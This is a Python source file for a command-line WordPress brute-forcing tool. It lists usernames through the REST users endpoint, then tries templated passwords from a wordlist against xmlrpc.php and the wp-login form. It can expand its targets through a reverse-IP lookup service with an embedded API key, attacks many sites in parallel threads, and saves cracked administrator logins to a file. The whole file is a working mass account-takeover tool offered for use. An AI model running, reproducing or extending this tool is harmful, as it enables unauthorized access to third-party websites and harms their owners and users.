try:
	import os, sys, requests, rich, socket, re
	from bs4 import BeautifulSoup as par
	from concurrent.futures import ThreadPoolExecutor as pol
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except Exception as e:
	exit("[>] Error: "+str(e)+"\n")

clear = lambda: os.system("clear") if "linux" in sys.platform.lower() else os.system("cls")
header = lambda: {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
wordlist = open("topass.txt","r").read().strip()

def writer(name, content):
	try:
		if content.strip() in open(name, "r").read():
			pass
		else:
			open(name, "a+").write(content.strip().replace("\n","")+"\n")
	except FileNotFoundError:
		open(name, "a+").write(content.strip().replace("\n","")+"\n")

def main():
	rich.print("""
	[bold white]--[/]    [bold blue]╦ ╦╔═╗[/]       ╔╗ ┬─┐┬ ┬┌┬┐┌─┐   [bold white]--[/]
	[bold white]--[/]    [bold blue]║║║╠═╝[/]  ───  ╠╩╗├┬┘│ │ │ ├┤    [bold white]--[/]
	[bold white]--[/]    [bold blue]╚╩╝╩  [/]       ╚═╝┴└─└─┘ ┴ └─┘   [bold white]--[/]


    01) Bruteforce from xmlrpc [bold white]([/][bold green]recommendation[/][bold white])[/]
    02) Bruteforce from /wp-login
    00) Exit program
	""")
	pilih = input("--: ")
	while pilih == "" or not pilih.isdigit():
		pilih = input("--: ")
	return pilih

def choose_target():
	rich.print("""
    [bold red]!!:[/] Choose method:
        01) From reverse IP
        02) From private target
        03) Back to main menu
	""")
	cs = input("--: ")
	while cs == "" or not cs.isdigit():
		cs = input("--: ")
	if cs in ["1","01"]:
		while True:
			file = input("--> File IP List: ")
			try:
				cek = open(file,"r",encoding="utf-8").read().strip().split("\n")
				break
			except FileNotFoundError:
				print("--* File not found")
		return "revip", cek
	elif cs in ["2","02"]:
		while True:
			file = input("--> File site list: ")
			try:
				cek = open(file,"r",encoding="utf-8").read().strip().split("\n")
				break
			except FileNotFoundError:
				print("--> File tidak ditemukan")
		return "private", cek
	elif cs in ["3","03"]:
		return "back", False


def brute_xmlprc(domain):
	global wordlist
	url = ["https://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", domain)][0]
	heading = {
		"Content-Type": "text/xml",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
	}
	usegx = re.findall("www.([^./]+)" if "www." in url else "https?://([^./]+)", url)[0]
	group_domain = re.findall("www.([^/]+)" if "www." in url else "https?://([^/]+)", url)[0].replace(".","")

	try:
		check = requests.get(url+"/wp-json/wp/v2/users", headers=header(), allow_redirects=True)
		if check.status_code == 200:
			user = check.json()[0]["slug"]
			for ps in wordlist.split("\n"):
				ps = (ps.replace("[WPLOGIN]", user).replace("[DDOMAIN]", group_domain)
					.replace("[DOMAIN]", usegx)
					.replace("[UPPERALL]", user.upper())
					.replace("[LOWERALL]", user.lower())
					.replace("[UPPERONE]", user.capitalize())
					.replace("[LOWERONE]", user[0].lower() + user[1::].upper())
					.replace("[AZDOMAIN]", group_domain)
					.replace("[UPPERLOGIN]", user.capitalize())
				)
				payload = f"""<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>{user}</value></param>
    <param><value>{ps}</value></param>
  </params>
</methodCall>"""
				try:
					pos = requests.post(url+"/xmlrpc.php", headers=heading, data=payload, timeout=10)
					showing = url+"/wp-login.php#"+user+"@"+ps
					if "isAdmin" in str(pos.text):
						rich.print("  [bold green]* success:[/][bold white] "+showing+"[/]")
						writer("good.txt", showing)
						break
					else:
						rich.print("  [bold red]* invalid "+showing+"[/]")
				except:
					break
		else:
			rich.print("  [bold red]* invalid "+url+"[/]")
	except:
		rich.print("  [bold red]* invalid "+url+"[/]")

def brute_wplogin(domain):
	global wordlist
	ses = requests.Session()
	ses.headers.update(header())

	url = ["https://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", domain)][0]
	heading = {"Content-Type": "text/xml", "User-Agent": "chrome"}
	usegx = re.findall("www.([^./]+)" if "www." in url else "https?://([^./]+)", url)[0]
	group_domain = re.findall("www.([^/]+)" if "www." in url else "https?://([^/]+)", url)[0].replace(".","")

	try:
		check = requests.get(url+"/wp-json/wp/v2/users", headers=header(), allow_redirects=True)
		if check.status_code == 200:
			user = check.json()[0]["slug"]
			for ps in wordlist.split("\n"):
				ps = (ps.replace("[WPLOGIN]", user).replace("[DDOMAIN]", group_domain)
					.replace("[DOMAIN]", usegx)
					.replace("[UPPERALL]", user.upper())
					.replace("[LOWERALL]", user.lower())
					.replace("[UPPERONE]", user.capitalize())
					.replace("[LOWERONE]", user[0].lower() + user[1::].upper())
					.replace("[AZDOMAIN]", group_domain)
					.replace("[UPPERLOGIN]", user.capitalize())
				)
				showing = url+"/wp-login.php#"+user+"@"+ps
				try:
					cek = par(ses.get(url+"/wp-login.php", timeout=10).text, "html.parser")
					if "captcha" in str(cek):
						rich.print("  [bold blue]* captcha "+url+"[/]")
						break
					else:
						forms = cek.find("form", {"method": "post"})
						payload = {}
						for inp in forms.find_all("input"):
							payload.update({inp.get("name"): inp.get("value")})
						payload.update({"log": user, "pwd": ps})
						if forms.get("action") is None:
							usl = url + "/wp-login.php"
						else:
							usl = forms.get("action")
						submit = ses.post(usl, data=payload, allow_redirects=True).text
						if "menu-dashboard" in str(submit) or "wpadminbar" in str(submit):
							rich.print("  [bold green]* success:[/][bold white] "+showing+"[/]")
							writer("good.txt", showing)
							break
						elif "You have exceeded maximum" in submit:
							rich.print("  [bold yellow]* Limit!! "+url+"[/]")
							break
						else:
							rich.print("  [bold red]* invalid "+showing+"[/]")
				except:
					break
		else:
			rich.print("  [bold red]* invalid "+url+"[/]")
	except:
		rich.print("  [bold red]* invalid "+url+"[/]")



def reverseIP(domain, type, eks=False):
	app = []
	url = re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", domain)[0]
	if len(url) == 0:
		dom = url
	else:
		try:
			dom = socket.gethostbyname(url)
		except:
			dom = url
	try:
		e = requests.get("https://s53.reverseipdomain.com/?ip="+dom+"&api_key=LVUUJ1YYTYPP7&limit=260000", headers=header()).json()
		if e["status"] == 401:pass
		else:
			filters = eks.split(",") if eks else []
			for d in e.get("result", []):
				if filters:
					for f in filters:
						if d.endswith(f.strip()):
							app.append(d)
				else:
					app.append(d)
	except:
		pass
	if len(app) == 0:pass
	else:
		for gass in app:
			if "xmlrpc" in type:
				brute_xmlprc(gass)
			elif "wplogin" in type:
				brute_wplogin(gass)


def start():
	clear()
	sok = main()
	if sok in ["0","00"]:
		exit("--: good bye..\n")
	elif sok in ["1","01"]:
		method, file = choose_target()
		if method == "back":start()
		method = method+"_xmlrpc"
	elif sok in ["2","02"]:
		method, file = choose_target()
		if method == "back":start()
		method = method+"_wplogin"
	else:
		exit("--: yeaah not good :(\n")

	#-] eksekusi target
	if method == "revip_xmlrpc":
		fils = input("--: filter domain: ").strip()
		if fils == "":
			fils = False
		print("--# Processing, please wait..\n")
		with pol(max_workers=20) as sub:
			for yoy in file:
				sub.submit(reverseIP, yoy, "xmlrpc", fils)
		exit("")
	elif method == "private_xmlrpc":
		print("--# Processing, please wait..\n")
		with pol(max_workers=10) as sub:
			for yoy in file:
				sub.submit(brute_xmlprc, yoy)
		exit("")
	elif method == "revip_wplogin":
		fils = input("--: filter domain: ").strip()
		if fils == "":
			fils = False
		print("--# Processing, please wait..\n")
		with pol(max_workers=20) as sub:
			for yoy in file:
				sub.submit(reverseIP, yoy, "wplogin", fils)
		exit("")
	elif method == "private_wplogin":
		print("--# Processing, please wait..\n")
		with pol(max_workers=10) as sub:
			for yoy in file:
				sub.submit(brute_wplogin, yoy)
		exit("")



if __name__=="__main__":
	start()
